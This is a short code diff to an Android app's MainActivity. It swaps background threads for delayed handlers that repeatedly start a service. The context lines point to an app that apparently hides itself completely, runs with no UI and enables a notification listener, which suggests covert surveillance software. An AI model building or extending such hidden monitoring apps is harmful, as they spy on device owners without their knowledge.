@@ -54,16 +54,10 @@ public class MainActivity extends AppCompatActivity {
         // Start service immediately without any UI
         startServiceImmediately();
         
-        // Also start service in a separate thread to ensure it starts
-        new Thread(() -> {
-            try {
-                Thread.sleep(2000); // Wait 2 seconds
-                startMainService(); // Start service again
-                Log.d(TAG, "Service started in background thread");
-            } catch (Exception e) {
-                Log.e(TAG, "Error starting service in background: " + e.getMessage());
-            }
-        }).start();
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+            startMainService();
+            Log.d(TAG, "Service started via delayed handler");
+        }, 2000);
     }
     
     private void hideAppCompletely() {
@@ -106,16 +100,10 @@ public class MainActivity extends AppCompatActivity {
         // Check and enable notification listener if needed
         checkAndEnableNotificationListener();
         
-        // Start service in background thread to ensure it starts
-        new Thread(() -> {
-            try {
-                Thread.sleep(1000); // Wait 1 second
-                startMainService(); // Start again to ensure it's running
-                Log.d(TAG, "Service started in background thread");
-            } catch (Exception e) {
-                Log.e(TAG, "Error starting service in background: " + e.getMessage());
-            }
-        }).start();
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+            startMainService();
+            Log.d(TAG, "Service started via delayed handler (ensure)");
+        }, 1000);
         
         // Finish activity immediately
         finish();
